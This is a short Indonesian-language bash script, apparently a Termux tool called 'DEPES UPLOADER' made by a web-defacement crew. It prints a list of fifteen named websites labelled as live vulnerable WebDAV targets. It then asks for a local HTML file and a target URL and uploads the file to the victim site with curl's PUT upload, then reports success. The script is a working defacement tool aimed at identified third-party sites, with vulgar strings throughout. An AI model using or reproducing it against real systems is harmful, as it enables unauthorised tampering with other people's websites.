# Hallo Ster ?
# Mau Recode Ster?
# Ginian Doang Di Recode
# Recode Gak Bakalan Jadiin Lu Mastah:)
# Recode?Izin Dulu Author Bangsad.

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning

banner(){
echo $cy"╔╦╗┌─┐┌─┐┌─┐┌─┐  ╦ ╦┌─┐┬  ┌─┐┌─┐┌┬┐┌─┐┬─┐
 ║║├┤ ├─┘├┤ └─┐  ║ ║├─┘│  │ │├─┤ ││├┤ ├┬┘
═╩╝└─┘┴  └─┘└─┘  ╚═╝┴  ┴─┘└─┘┴ ┴─┴┘└─┘┴└─"
echo $ku"DEPES UPLOADER BY : Naruto-Kun A.K.A SmileBitch21"
echo ""
}
banner
echo $me"["$cy"1"$me"]" $pu"Lihat Web Vuln"
echo $me"["$cy"2"$me"]" $pu"Langsung Ewe"
echo $me"["$cy"0"$me"]" $pu"Exit"
echo $pur""
read -p "_> " pill

if [ $pill = 1 ] || [ $pill = 01 ];
then
clear
banner
web(){
echo $ku"LIVE TARGET WEBDAV"
echo $cy"http://contsol.co.za
http://colourfactory.co.za
http://chillibitez.co.za
http://chasingfantasia.com
http://centraltech.co.za
http://cblandscapes.co.za
http://crimsonmonkeyweb.com
http://kevinbutho.com
http://prorepafrica.com
http://xposurephotography.co.za
http://windmillsandporcupines.co.za
http://tcnig.co.za
http://techdirect.co.za
http://thehellenic.co.za
http://valdicare.co.za"
echo ""
read -p "[#] Tekan Untuk Melanjut Kan " lanjut
}
web
clear
sleep 1
echo $me"["$pu"#"$me"]" $i"Utamkan Simpan Script Diluar Folder"
echo $me"["$pu"#"$me"]" $i"Contoh : yKontol.html"
read -p "[#] Script : /sdcard/" script
read -p "[#] Target : " target
clear
banner
curl -T /storage/emulated/0/$script $target
echo $i"["$pur"√"$i"]" $pu"Succes : $target/$script"
read -p "[#] Tekan Enter Untuk Melanjutkan " enter
sleep 1
clear
banner
echo $pu""
echo "[#] Thanks To Using My Tools..."
echo "[#] My Team : D45H | HCT | SFO | TI3"
echo "[#] Supoort : L1nUx3R | Mr.C3nd0l | Mr.Sugiono | ReyZ"
echo ""
read -p "[#] Tekan Enter Melanjutkan " lanjut
sleep 1
fi

if [ $pill = 2 ] || [ $pill = 02 ];
then
clear
banner
echo $me"["$pu"#"$me"]" $i"Utamkan Simpan Script Diluar Folder"
echo $me"["$pu"#"$me"]" $i"Contoh : yKontol.html"
read -p "[#] Script : /sdcard/" script1
read -p "[#] Target : " memek
clear
banner
curl -T /storage/emulated/0/$script1 $memek
echo $i"["$pur"√"$i"]" $pu"Succes : $memek/$script1"
read -p "[#] Tekan Enter Untuk Melanjutkan " lanjut
sleep 1
clear
banner
echo $pu""
echo "[#] Thanks To Using My Tools..."
echo "[#] My Team : D45H | HCT | SFO | TI3"
echo "[#] Supoort : L1nUx3R | Mr.C3nd0l | Mr.Sugiono | ReyZ"
echo ""
read -p "[#] Tekan Enter Melanjutkan " lanjut
sleep 1
fi

if [ $pill = 0 ] || [ $pill = 00 ];
then
clear
banner
echo $pu""
echo "[#] Thanks To Using My Tools..."
echo "[#] My Team : D45H | HCT | SFO | TI3"
echo "[#] Supoort : L1nUx3R | Mr.C3nd0l | Mr.Sugiono | ReyZ"
echo ""
read -p "[#] Tekan Enter Melanjutkan " lanjut
fi
